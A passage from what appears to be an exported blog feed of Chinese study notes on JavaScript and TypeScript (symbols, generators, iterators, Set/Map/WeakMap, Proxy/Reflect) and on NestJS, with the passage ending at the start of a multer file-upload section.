&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Object.getOwnPropertySymbols可以读到symbol，但读不到字符串键</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getOwnPropertySymbols</span>(obj2))   <span class="comment">// -&gt;[ Symbol(name), Symbol(name) ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Reflect.ownKeys，终于能同时读到字符串键和symbol了！！！</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(obj2))    <span class="comment">// -&gt;[ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, Symbol(name), Symbol(name) ]</span></span><br></pre></td></tr></table></figure>

<h1 id="生成器和迭代器"><a href="#生成器和迭代器" class="headerlink" title="生成器和迭代器"></a>生成器和迭代器</h1><p>生成器和迭代器的用法其实一样，就是写法不同</p>
<h2 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h2><p>带星号*的函数就是一个生成器(generator)，自带关键字yield用于返回迭代值</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.生成器generator 带星号*的函数就是一个生成器</span></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">gen</span>(<span class="params"></span>) &#123; </span><br><span class="line">  <span class="comment">// 关键字yield，后跟一个返回值，同步或异步都可以</span></span><br><span class="line">  <span class="keyword">yield</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&quot;yajue&quot;</span>)</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&quot;yjsp&quot;</span></span><br><span class="line">  <span class="keyword">yield</span> <span class="number">114514</span></span><br><span class="line">  <span class="keyword">yield</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">1919810</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> omg = <span class="title function_">gen</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用生成器返回值的next()方法，可以获得一个对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(omg.<span class="title function_">next</span>()) <span class="comment">// -&gt;&#123; value: Promise &#123; &#x27;yajue&#x27; &#125;, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(omg.<span class="title function_">next</span>()) <span class="comment">// -&gt;&#123; value: &#x27;yjsp&#x27;, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(omg.<span class="title function_">next</span>()) <span class="comment">// -&gt;&#123; value: 114514, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(omg.<span class="title function_">next</span>()) <span class="comment">// -&gt;&#123; value: Promise &#123; 1919810 &#125;, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(omg.<span class="title function_">next</span>()) <span class="comment">// -&gt;&#123; value: undefined, done: true &#125;</span></span><br><span class="line"><span class="comment">// 1.next()会用value键返回各yield后跟的返回值</span></span><br><span class="line"><span class="comment">// 2.即使yield返回Promise，next()总是按照先后顺序取值</span></span><br><span class="line"><span class="comment">// 3.done键表示“是否能继续迭代”，它在yield返回次数+1次调用next()时才为false</span></span><br></pre></td></tr></table></figure>

<h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>使用迭代器可以遍历可迭代对象</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这些类型的身上都藏着迭代器</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">set</span>:<span class="title class_">Set</span>&lt;<span class="built_in">number</span>&gt; = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>])</span><br><span class="line"><span class="keyword">let</span> <span class="attr">map</span>:<span class="title class_">Map</span>&lt;<span class="built_in">any</span>,<span class="built_in">any</span>&gt; = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&quot;omg&quot;</span>,<span class="number">1</span>)</span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&quot;foo&quot;</span>,<span class="number">2</span>)</span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&quot;bar&quot;</span>,<span class="number">3</span>)</span><br><span class="line"><span class="keyword">let</span> <span class="attr">arr</span>:<span class="built_in">number</span>[] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>]</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">args</span>(<span class="params">...args:<span class="built_in">string</span>[]</span>) &#123;</span><br><span class="line">  <span class="comment">// arguments是一个类数组对象，没有那些数组方法</span></span><br><span class="line">  <span class="title function_">each</span>(<span class="variable language_">arguments</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这是个可迭代可迭代对象的函数:P</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">each</span> = (<span class="params">value:<span class="built_in">any</span></span>)=&gt; &#123;</span><br><span class="line">  <span class="comment">// 成员Symbol.iterator是个函数，调用它就能得到迭代器</span></span><br><span class="line">  <span class="keyword">let</span> <span class="title class_">It</span>:<span class="built_in">any</span> = value[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]()</span><br><span class="line">  <span class="keyword">let</span> <span class="attr">next</span>:<span class="built_in">any</span> = &#123;<span class="attr">done</span>:<span class="literal">false</span>&#125;</span><br><span class="line">  <span class="comment">// done为true时才停止执行</span></span><br><span class="line">  <span class="keyword">while</span>(!next.<span class="property">done</span>) &#123;</span><br><span class="line">    next = <span class="title class_">It</span>.<span class="title function_">next</span>()</span><br><span class="line">    <span class="comment">// done为false时打印value值</span></span><br><span class="line">    <span class="keyword">if</span>(!next.<span class="property">done</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(next.<span class="property">value</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">each</span>(set)   <span class="comment">// 依次是1 4 5 9 8 0 3 6</span></span><br><span class="line"><span class="title function_">each</span>(map)   <span class="comment">// 依次是[ &#x27;omg&#x27;, 1 ] [ &#x27;foo&#x27;, 2 ] [ &#x27;bar&#x27;, 3 ]</span></span><br><span class="line"><span class="title function_">each</span>(arr)   <span class="comment">// 依次是1 2 3 5 7 11 13 17 19 23 29</span></span><br><span class="line"><span class="title function_">args</span>(<span class="string">&quot;NYN&quot;</span>,<span class="string">&quot;ICG&quot;</span>,<span class="string">&quot;SZ&quot;</span>,<span class="string">&quot;milk&quot;</span>,<span class="string">&quot;flour&quot;</span>)   <span class="comment">// 依次是&quot;NYN&quot; &quot;ICG&quot; &quot;SZ&quot; &quot;milk&quot; &quot;flour&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 迭代器的语法糖：对可迭代对象使用for of</span></span><br><span class="line"><span class="comment">// 记得不要给对象用for of，因为普通对象不可迭代（没有Symbol.iterator）</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> value <span class="keyword">of</span> set) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value)  <span class="comment">// 依次是1 4 5 9 8 0 3 6</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组解构的底层原理也是调用Symbol.iterator</span></span><br><span class="line"><span class="keyword">let</span> [a,b,c] = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>]</span><br><span class="line"><span class="keyword">let</span> d = [<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>]</span><br><span class="line"><span class="keyword">let</span> copy = [...d]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a,b,c)    <span class="comment">// -&gt;1 1 4</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d)        <span class="comment">// -&gt;[ 5, 1, 4 ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 只要在对象里实现Symbol.iterator，就能让对象可迭代</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">max</span>:<span class="number">5</span>,</span><br><span class="line">  <span class="attr">current</span>:<span class="number">0</span>,</span><br><span class="line">  [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">max</span>:<span class="variable language_">this</span>.<span class="property">max</span>,</span><br><span class="line">      <span class="attr">current</span>:<span class="variable language_">this</span>.<span class="property">current</span>,</span><br><span class="line">      <span class="title function_">next</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">current</span> == <span class="variable language_">this</span>.<span class="property">max</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">value</span>:<span class="literal">undefined</span>,</span><br><span class="line">            <span class="attr">done</span>:<span class="literal">true</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">value</span>:<span class="variable language_">this</span>.<span class="property">current</span>++,</span><br><span class="line">            <span class="attr">done</span>:<span class="literal">false</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对象居然可以迭代辣！</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> value <span class="keyword">of</span> obj) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value)    <span class="comment">// 依次是0 1 2 3 4</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 也可以数组解构辣！</span></span><br><span class="line"><span class="keyword">let</span> x = [...obj]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x)    <span class="comment">// -&gt;[ 0, 1, 2, 3, 4 ]</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Set, Map, WeakSet和WeakMap</title>
    <url>/web/study/JavaScript/Set,%20Map,%20WeakSet%E5%92%8CWeakMap.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<p>Set, Map, WeakSet和WeakMap这四种类型于ES6新增</p>
<p>Set和Map，类似于数组和对象</p>
<h1 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h1><p>集合由一组无序且唯一（即不重复）的项组成，相当于一个既没有重复元素，也没有顺序概念的数组</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">set</span>:<span class="title class_">Set</span>&lt;<span class="built_in">number</span>&gt; = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">0</span>])</span><br><span class="line"><span class="comment">// Set具有天然去重的能力（但是不给引用类型去重）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set)            <span class="comment">// -&gt;Set(6) &#123; 1, 4, 5, 9, 8, 0 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回字典所包含的元素个数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="property">size</span>)       <span class="comment">// -&gt;6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加某个值，返回Set本身</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="title function_">add</span>(<span class="number">3</span>))     <span class="comment">// -&gt;Set(7) &#123; 1, 4, 5, 9, 8, 0, 3 &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set)            <span class="comment">// -&gt;Set(7) &#123; 1, 4, 5, 9, 8, 0, 3 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回一个布尔值，表示该值是否为Set的成员</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="title function_">has</span>(<span class="number">1</span>))     <span class="comment">// -&gt;true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除某个值，返回一个布尔值，表示删除是否成功</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set.<span class="title function_">delete</span>(<span class="number">0</span>))  <span class="comment">// -&gt;true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set)            <span class="comment">// -&gt;Set(6) &#123; 1, 4, 5, 9, 8, 3 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除所有成员，无返回值</span></span><br><span class="line">set.<span class="title function_">clear</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(set)            <span class="comment">// -&gt;Set(0) &#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Set还支持很多遍历方法</span></span><br></pre></td></tr></table></figure>

<h1 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h1><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 和对象的区别：Map的key可以是引用类型</span></span><br><span class="line"><span class="comment">// 如果需要键值对数据结构，Map比对象更合适</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">map</span>:<span class="title class_">Map</span>&lt;<span class="built_in">object</span>,<span class="built_in">any</span>&gt; = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line">map.<span class="title function_">set</span>(&#123;&#125;,<span class="string">&quot;yjsp&quot;</span>)</span><br><span class="line">map.<span class="title function_">set</span>([],<span class="number">114</span>)</span><br><span class="line">map.<span class="title function_">set</span>(<span class="function">()=&gt;</span>&#123;&#125;,<span class="number">514</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Map的方法和Set基本一致</span></span><br></pre></td></tr></table></figure>

<h1 id="WeakSet和WeakMap"><a href="#WeakSet和WeakMap" class="headerlink" title="WeakSet和WeakMap"></a>WeakSet和WeakMap</h1><p>weakSet和weakMap的键都是弱引用，不会被计入垃圾回收</p>
<p>当键的引用数量为0时，就预示着它会被释放</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">obj</span>:<span class="built_in">any</span> = &#123;<span class="attr">name</span>:<span class="string">&#x27;yajue&#x27;</span>&#125;  <span class="comment">// 引用数：1</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">jbo</span>:<span class="built_in">any</span> = obj             <span class="comment">// 引用数：2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// WeakMap的key只能是引用类型</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">wmap</span>:<span class="title class_">WeakMap</span>&lt;<span class="built_in">object</span>,<span class="built_in">string</span>&gt; = <span class="keyword">new</span> <span class="title class_">WeakMap</span>()</span><br><span class="line">wmap.<span class="title function_">set</span>(obj,<span class="string">&quot;yjsp&quot;</span>)    <span class="comment">// 引用数：2  WeakSet和WeakMap的键不计引用数</span></span><br><span class="line"> </span><br><span class="line">obj = <span class="literal">null</span>          <span class="comment">// 引用数：1</span></span><br><span class="line">jbo = <span class="literal">null</span>          <span class="comment">// 引用数：0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果，WeakMap里没有这项了</span></span><br><span class="line"><span class="comment">// 在浏览器环境（V8 GC）中，垃圾回收需要一定时间（最少200ms）</span></span><br><span class="line"><span class="comment">// 所以WeakSet和WeakMap无法取单个值或遍历，因为不稳定</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(wmap)</span><br><span class="line">&#125;,<span class="number">500</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Proxy和Reflect</title>
    <url>/web/study/JavaScript/Proxy%E5%92%8CReflect.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><p>Proxy对象用于创建一个对象的代理，从而实现基本操作（如属性查找、赋值、枚举、函数调用等）的拦截和自定义</p>
<p>总共有13种拦截器，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy">MDN - Proxy</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">nane</span>:<span class="string">&quot;yjsp&quot;</span>,<span class="attr">age</span>:<span class="number">24</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数1：被代理的引用类型   参数2：包含拦截器的配置项</span></span><br><span class="line"><span class="keyword">let</span> personProxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(person,&#123;  </span><br><span class="line">  <span class="comment">// 拦截取值操作</span></span><br><span class="line">  <span class="comment">// receiver：保证上下文的正确</span></span><br><span class="line">  <span class="title function_">get</span>(<span class="params">target,key,receiver</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(target.<span class="property">age</span>&lt;=<span class="number">18</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> target[key]</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;成年&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(personProxy.<span class="property">age</span>)    <span class="comment">// -&gt;&quot;成年&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h1><p>Reflect的所有属性和方法都是静态的，用于对对象进行语义化操作</p>
<p>总共有13种反射，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect">MDN - Reflect</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">nane</span>:<span class="string">&quot;yjsp&quot;</span>,<span class="attr">age</span>:<span class="number">24</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后一个参数用于保持上下文的正确</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Reflect</span>.<span class="title function_">get</span>(person,<span class="string">&quot;name&quot;</span>,person))          <span class="comment">// -&gt;&quot;yjsp&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Reflect</span>.<span class="title function_">set</span>(person,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;yajue&quot;</span>,person))  <span class="comment">// -&gt;true（修改成功）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Reflect</span>.<span class="title function_">get</span>(person,<span class="string">&quot;name&quot;</span>,person))          <span class="comment">// -&gt;&quot;yajue&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="Proxy结合Reflect"><a href="#Proxy结合Reflect" class="headerlink" title="Proxy结合Reflect"></a>Proxy结合Reflect</h1><p>反射可以操作对象，而且它的参数和拦截器一模一样，所以它们经常被一同使用</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 事件存储器</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">list</span>:<span class="title class_">Set</span>&lt;<span class="title class_">Function</span>&gt; = <span class="keyword">new</span> <span class="title class_">Set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 订阅函数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">autorun</span> = (<span class="params">cb:<span class="built_in">Function</span></span>)=&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span>(!list.<span class="title function_">has</span>(cb)) &#123;</span><br><span class="line">    list.<span class="title function_">add</span>(cb)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> observable = &lt;T <span class="keyword">extends</span> <span class="built_in">object</span>&gt;<span class="function">(<span class="params">params:T</span>)=&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(params,&#123;</span><br><span class="line">    <span class="comment">// 值改变时，依次调用回调函数</span></span><br><span class="line">    <span class="title function_">set</span>(<span class="params">target,key,value,receiver</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> result = <span class="title class_">Reflect</span>.<span class="title function_">set</span>(target,key,value,receiver)</span><br><span class="line">      list.<span class="title function_">forEach</span>(<span class="function"><span class="params">fn</span>=&gt;</span><span class="title function_">fn</span>())</span><br><span class="line">      <span class="keyword">return</span> result</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> personProxy = <span class="title function_">observable</span>(&#123;<span class="attr">name</span>:<span class="string">&quot;yjsp&quot;</span>,<span class="attr">age</span>:<span class="number">24</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存储一个订阅函数</span></span><br><span class="line"><span class="title function_">autorun</span>(<span class="function">()=&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;发生了值的改变&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">personProxy.<span class="property">name</span> = <span class="string">&quot;yajue&quot;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Nestjs概述</title>
    <url>/web/study/Nestjs/1.Nestjs%E6%A6%82%E8%BF%B0.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="Nestjs"><a href="#Nestjs" class="headerlink" title="Nestjs"></a>Nestjs</h1><p>Nestjs是一个构建高效可扩展应用程序的开发框架，基于Nodejs服务端</p>
<p>完全支持TypeScript，结合了AOP面向切面的编程方式</p>
<p>spring MVC风格，其中有依赖注入、IOC 控制反转，都是借鉴了Angualr</p>
<p>底层使用express或Fastify，并在他们的基础上提供了一定程度的抽象，同时也将其API直接暴露给开发人员，以便轻松使用每个平台的无数第三方模块</p>
<p><a href="https://nestjs.com/">英文官网</a>   <a href="https://nestjs.bootcss.com/">中文文档1</a>   <a href="https://docs.nestjs.cn/">中文文档2</a></p>
<h1 id="Nestjs内置框架"><a href="#Nestjs内置框架" class="headerlink" title="Nestjs内置框架"></a>Nestjs内置框架</h1><h2 id="Express"><a href="#Express" class="headerlink" title="Express"></a>Express</h2><p>快速构建服务端应用程序、学习成本极低、易上手，<a href="https://www.expressjs.com.cn/">中文官网</a></p>
<h2 id="Fastify"><a href="#Fastify" class="headerlink" title="Fastify"></a>Fastify</h2><p>高性能、可扩展、基于Schema、日志记录、对开发人员友好、支持TypeScript，<a href="https://www.fastify.cn/">中文官网</a></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>文件操作</title>
    <url>/web/study/Nestjs/10.%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h1><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install @nestjs/platform-express  # Nestjs自带的</span><br><span class="line">npm install multer@1.4.5-lts.1 -S	# 默认安装2.0.0，引入包就报错，所以要指定成旧版本</span><br><span class="line">npm install @types/multer -D</span><br></pre></td></tr></table></figure>

<h2 id="资源存放路径"><a href="#资源存放路径" class="headerlink" title="资源存放路径"></a>资源存放路径</h2><p>在module中注册：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UploadService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./upload.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UploadController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./upload.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">MulterModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/platform-express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; diskStorage &#125; <span class="keyword">from</span> <span class="string">&#x27;multer&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; extname, join &#125; <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="attr">imports</span>: [</span><br><span class="line">    <span class="title class_">MulterModule</span>.<span class="title function_">register</span>(&#123;</span><br><span class="line">      <span class="comment">// 指定上传文件后存放的路径，用diskStorage指定路径</span></span><br><span class="line">      <span class="attr">storage</span>: <span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">        <span class="comment">// 指定存放位置</span></span><br><span class="line">        <span class="attr">destination</span>: <span class="title function_">join</span>(__dirname, <span class="string">&#x27;../images&#x27;</span>),</span><br><span class="line">        <span class="comment">// 重命名</span></span><br><span class="line">        <span class="attr">filename</span>: <span class="function">(<span class="params">_, file, callback</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="comment">// extname可以截取文件内容（比如获得后缀名）</span></span><br><span class="line">          <span class="keyword">const</span> fileName = <span class="string">`<span class="subst">$&#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">            <span class="keyword">new</span> <span class="built_in">Date</span>().getTime() + extname(file.originalname)</span></span></span><br><span class="line"><span class="subst"><span class="string">          &#125;</span>`</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="literal">null</span>, fileName);</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">UploadController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [<span class="title class_">UploadService</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">UploadModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="文件上传接口"><a href="#文件上传接口" class="headerlink" title="文件上传接口"></a>文件上传接口</h2><p>在controller中编写：</p>
